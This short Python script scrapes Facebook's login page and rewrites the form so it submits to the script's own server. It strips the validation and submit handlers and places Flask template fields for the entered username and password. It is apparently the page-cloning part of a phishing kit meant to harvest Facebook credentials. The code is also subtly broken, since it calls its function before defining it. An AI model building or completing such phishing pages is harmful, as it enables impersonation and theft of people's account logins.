import requests
# import flask
import os
from bs4 import BeautifulSoup

# app = Flask(__name__)

if os.path.isfile('fb.html') is False:
    getHTML()

def getHTML():
    headers = {'Accept-Language':'en-US,en;q=0.5'}
    link = 'https://www.facebook.com/'
    response = requests.get(link, headers = headers).text
    soup = BeautifulSoup(response, 'html.parser')

    login_form = soup.find('form',{'id':'login_form'})
    login_form['action'] = ''
    del login_form['novalidate']
    del login_form['onsubmit']

    email = login_form.find('input',{'id':'email'})
    psswrd = login_form.find('input',{'id':'pass'})
    email['value'] = "{{request.form.username}}"
    psswrd['value'] = "{{request.form.password}}"

    with open('fb.html', 'w', encoding = 'utf-8') as f:
         f.write(soup.prettify())

getHTML()
